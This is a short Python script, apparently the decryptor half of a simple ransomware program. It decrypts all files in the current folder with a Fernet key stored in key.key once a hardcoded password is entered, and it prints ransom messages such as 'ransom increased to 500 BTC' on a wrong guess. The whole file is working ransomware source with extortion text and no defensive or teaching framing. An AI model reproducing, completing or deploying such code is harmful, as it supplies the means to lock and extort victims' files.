import os
from cryptography.fernet import Fernet

files = []

if ("key.key" not in os.listdir()):
    print("your files are not encrypted, yet.")
    exit()
    
for file in os.listdir():
    if file == "encrypt.py" or file == "decrypt.py" or file == "key.key":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("key.key", "rb") as theKey:
    key = theKey.read()

secret = input("enter secret key to decrypt: ")

if secret != "verysecurepassword":
    print("incorrect. ransom increased to 500 BTC. exiting..")
    exit()
else:
    for file in files:
        with open(file, "rb") as theFile:
            contents = theFile.read()
        contents_decrypted = Fernet(key).decrypt(contents)
        with open(file, "wb") as theFile:
            theFile.write(contents_decrypted)
    os.remove("key.key")
    print("congratulations, your files have been decrypted.")
